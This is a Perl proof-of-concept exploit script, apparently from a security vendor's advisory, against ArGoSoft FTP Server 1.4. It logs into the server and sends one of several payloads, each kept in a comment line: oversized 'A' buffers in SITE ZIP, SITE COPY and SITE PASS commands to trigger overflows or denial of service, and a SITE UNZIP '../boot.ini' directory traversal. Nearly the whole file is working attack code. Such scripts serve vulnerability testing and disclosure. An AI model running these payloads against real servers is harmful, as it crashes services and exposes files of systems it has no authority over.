#!/usr/bin/perl
# Multiple Vulnerabilities in ArGoSoft FTP Server version 1.4 (1.4.1.4)
# Created by Beyond Security Ltd. - All rights reserved.

use IO::Socket;

$host = "192.168.1.243";

$remote = IO::Socket::INET->new ( Proto => "tcp",
     PeerAddr => $host,
     PeerPort => "2119",,
    );

unless ($remote) { die "cannot connect to ftp daemon on $host" }

print "connected\n";
while (<$remote>)
{
 print $_;
 if (/220 /)
 {
  last;
 }
}


$remote->autoflush(1);

my $ftp = "USER username\r\n";

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/331 /)
 {
  last;
 }
}

$ftp = join("", "PASS ", "password", "\r\n");
print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/230 /)
 {
  last;
 }
}

#$ftp = join ("", "SITE ZIP ", "A"x512, "\r\n");
#$ftp = join ("", "SITE ZIP storm.zip /f:", "A"x2048, "\r\n");
#$ftp = join ("", "SITE COPY ", "A"x2048, " ", "A"x10, "\r\n");
#$ftp = join ("", "SITE UNZIP ", "../boot.ini\r\n"); # Directory Traversal (we know a certain file exists)
#$ftp = join ("", "SITE PASS ", "storm ", "A"x3500, "\r\n"); # DoS ... against the user database

#Choose one of the above to test the vulnerabilities mentioned

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/250 Done/)
 {
  last;
 }
}

close $remote;
